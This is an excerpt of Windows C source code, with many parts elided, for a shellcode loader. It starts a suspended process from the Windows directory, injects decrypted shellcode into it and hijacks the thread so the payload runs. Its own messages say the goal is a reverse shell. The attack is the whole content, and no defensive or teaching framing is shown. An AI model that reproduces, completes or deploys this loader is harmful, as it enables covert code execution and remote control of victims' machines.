...
BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
    ...
    DWORD dwResult = GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH);
    ...
    if (GetFileAttributesA(lpPath) == INVALID_FILE_ATTRIBUTES) {
...
int main() {
    ...
    // Step 2: Create a suspended process
    ...
    // Step 3: Inject shellcode into the remote process
    printf("[i] Injecting shellcode...\n");
    if (!InjectShellcodeToRemoteProcess(hProcess, (PBYTE)pPlainText, sPlainTextSize, &pRemoteAddress)) {
    ...
    // Step 4: Hijack the thread to execute the shellcode
    ...
    printf("[+] Thread hijacked and shellcode executed\n");
    ...
    printf("[i] Execution completed. Check for reverse shell.\n");
    return 0;
}
